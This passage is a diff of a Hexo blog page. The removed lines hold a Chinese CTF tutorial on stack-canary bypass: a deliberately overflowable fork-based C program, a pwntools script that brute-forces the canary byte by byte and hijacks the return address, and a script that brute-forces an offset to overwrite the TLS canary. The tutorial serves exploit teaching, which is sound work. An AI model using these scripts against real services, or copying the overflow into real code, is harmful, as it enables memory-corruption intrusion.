-<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
-<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
-<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
-<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
-<p>该结构体如下所示：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
-<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
-<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
-<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1811,7 +1809,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">150</span>
+          <span class="site-state-item-count">151</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1865,7 +1863,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">29:19</span>
+    <span title="Reading time total">29:23</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
